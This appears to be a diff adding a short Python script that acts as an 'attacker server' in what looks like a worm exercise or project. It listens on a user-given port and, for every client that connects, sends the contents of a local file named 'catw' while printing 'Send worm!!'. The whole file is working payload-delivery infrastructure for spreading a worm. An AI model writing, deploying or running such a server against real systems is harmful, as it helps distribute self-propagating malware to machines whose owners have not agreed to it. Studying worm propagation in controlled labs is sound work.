@@ -1,0 +1,37 @@
+#!/usr/bin/env python3
+
+import socket
+import sys
+
+def main():
+	attack_port = int(sys.argv[1])
+	attack_ip = "0.0.0.0"
+	print("attack_port: {port}".format(port=attack_port))
+
+	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server.bind((attack_ip, attack_port))
+
+	server.listen(10)
+
+	print("attacker server listening on {ip}:{port}".format(ip=attack_ip, port=attack_port))
+
+	while True:
+		client_socket, client_addr = server.accept()
+		print("conencted by client {addr}".format(addr=client_addr))
+		
+		with open("./catw", 'rb') as f:
+			data_bytes = f.read()
+
+		client_socket.send(data_bytes)
+		print("Send worm!!")
+
+		#recv_data = client_socket.recv(1024).decode("UTF-8")
+		#print("received data: {recv_data}".format(recv_data=recv_data))
+        
+		#response = "Hello, Client"
+		#client_socket.send(response.encode("UTF-8"))
+
+
+
+if __name__ == '__main__':
+	main()
